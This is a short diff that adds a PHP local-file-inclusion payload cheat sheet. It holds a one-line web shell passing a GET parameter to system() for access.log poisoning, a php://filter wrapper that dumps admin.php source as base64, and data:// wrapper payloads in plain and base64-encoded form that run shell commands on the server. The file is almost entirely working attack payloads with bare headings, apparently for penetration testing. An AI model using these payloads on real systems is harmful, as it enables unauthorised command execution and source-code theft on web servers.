@@ -1,0 +1,12 @@
+# PHP simple script for access.log
+<?php echo system($_GET['cmd']); ?>
+
+# PHP Wrapper
+# Read
+php://filter/convert.base64-encode/resource=admin.php
+
+# RCE
+data://text/plain,<?php%20echo%20system('ls');?>"
+
+# echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls 
